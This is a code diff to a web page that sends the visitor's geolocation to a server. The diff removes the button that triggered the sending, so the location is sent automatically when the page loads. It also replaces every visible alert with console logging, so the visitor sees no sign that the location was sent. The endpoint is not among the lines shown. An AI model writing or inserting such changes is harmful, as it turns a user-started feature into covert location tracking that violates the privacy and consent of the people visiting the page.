@@ -13,18 +13,11 @@
             background-color: #f4f4f9;
             font-family: Arial, sans-serif;
         }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
     </style>
 </head>
 <body>
-    <button onclick="sendLocation()">Send Location</button>
-
     <script>
-        function sendLocation() {
+        window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     const latitude = position.coords.latitude;
@@ -45,17 +38,17 @@
                     })
                     .then(response => {
                         if (response.ok) {
-                            alert('Location sent successfully!');
+                            console.log('Location sent successfully!');
                         } else {
-                            alert('Failed to send location.');
+                            console.error('Failed to send location.');
                         }
                     })
                     .catch(error => console.error('Error:', error));
                 }, function(error) {
-                    alert('Error getting location: ' + error.message);
+                    console.error('Error getting location:', error.message);
                 });
             } else {
-                alert('Geolocation is not supported by this browser.');
+                console.error('Geolocation is not supported by this browser.');
             }
         }
     </script>
